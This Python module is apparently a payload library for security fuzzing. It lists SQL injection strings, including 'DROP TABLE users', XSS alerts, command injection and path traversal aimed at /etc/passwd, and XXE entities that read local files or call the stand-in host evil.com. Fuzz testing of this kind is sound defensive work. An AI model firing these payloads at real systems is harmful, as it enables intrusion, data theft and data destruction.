"""
Comprehensive payload library for security fuzzing.
"""
import random
import string

class PayloadGenerator:
    """Generates various security testing payloads."""
    
    # SQL Injection payloads
    SQL_INJECTION = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "admin'/*",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' OR 1=1--",
        "1'; DROP TABLE users--",
        "' OR 'x'='x",
        "' OR 1=1#",
        "' UNION SELECT 1,2,3--",
        "1' OR '1'='1",
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--"
    ]
    
    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<div onmouseover=alert('XSS')>hover me</div>",
        "javascript:alert('XSS')",
        "<svg/onload=alert('XSS')>",
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>"
    ]
    
    # Command Injection payloads
    COMMAND_INJECTION = [
        "; ls",
        "| ls",
        "&& ls",
        "|| ls",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "; whoami",
        "| whoami",
        "&& whoami",
        "; id",
        "| id",
        "&& id",
        "; ping -c 4 127.0.0.1",
        "| ping -c 4 127.0.0.1"
    ]
    
    # Path Traversal payloads
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2F..%2F..%2Fetc%2fpasswd",
        "....%2F....%2F....%2Fetc%2fpasswd"
    ]
    
    # Buffer Overflow patterns
    BUFFER_OVERFLOW = [
        "A" * 1000,
        "A" * 2000,
        "A" * 5000,
        "A" * 10000,
        random.choices(string.ascii_letters + string.digits, k=1500),
        random.choices(string.printable, k=2000)
    ]
    
    # CSRF test cases (missing tokens)
    CSRF_PAYLOADS = [
        {},  # Missing CSRF token
        {"csrf_token": ""},  # Empty token
        {"csrf_token": "invalid_token"}  # Invalid token
    ]
    
    # IDOR test cases
    IDOR_PAYLOADS = [
        {"user_id": "-1"},
        {"user_id": "0"},
        {"user_id": "999999"},
        {"user_id": "../1"},
        {"user_id": "1' OR '1'='1"},
        {"user_id": "admin"}
    ]
    
    # Session fixation/test cases
    SESSION_PAYLOADS = [
        {"session_id": ""},
        {"session_id": "short"},
        {"session_id": "12345"},
        {"session_id": "admin"},
        {"session_id": "..\\..\\..\\"},
        {"session_id": "<script>alert('XSS')</script>"}
    ]
    
    # LDAP Injection
    LDAP_INJECTION = [
        "*",
        "*)(&",
        "*))%00",
        "*()|&",
        "admin)(&(password=*))",
        "admin)(|(password=*))"
    ]
    
    # XML/XXE payloads
    XXE_PAYLOADS = [
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]><foo>&xxe;</foo>"
    ]
    
    # Template Injection
    TEMPLATE_INJECTION = [
        "${7*7}",
        "{{7*7}}",
        "${#context['xwork.MethodAccessor.denyMethodExecution']=false}",
        "#{7*7}",
        "${@java.lang.System@getProperty('user.home')}"
    ]
    
    @staticmethod
    def get_all_payloads():
        """Get all payload categories as a dictionary."""
        return {
            "sql_injection": PayloadGenerator.SQL_INJECTION,
            "xss": PayloadGenerator.XSS_PAYLOADS,
            "command_injection": PayloadGenerator.COMMAND_INJECTION,
            "path_traversal": PayloadGenerator.PATH_TRAVERSAL,
            "buffer_overflow": PayloadGenerator.BUFFER_OVERFLOW,
            "csrf": PayloadGenerator.CSRF_PAYLOADS,
            "idor": PayloadGenerator.IDOR_PAYLOADS,
            "session_fixation": PayloadGenerator.SESSION_PAYLOADS,
            "ldap_injection": PayloadGenerator.LDAP_INJECTION,
            "xxe": PayloadGenerator.XXE_PAYLOADS,
            "template_injection": PayloadGenerator.TEMPLATE_INJECTION
        }
    
    @staticmethod
    def generate_random_payloads(count=10):
        """Generate random payloads from all categories."""
        all_payloads = PayloadGenerator.get_all_payloads()
        flat_payloads = []
        for category, payloads in all_payloads.items():
            if isinstance(payloads[0], str):
                flat_payloads.extend(payloads)
            else:
                # Handle dict payloads (like CSRF, IDOR)
                flat_payloads.extend([str(p) for p in payloads])
        
        return random.sample(flat_payloads, min(count, len(flat_payloads)))

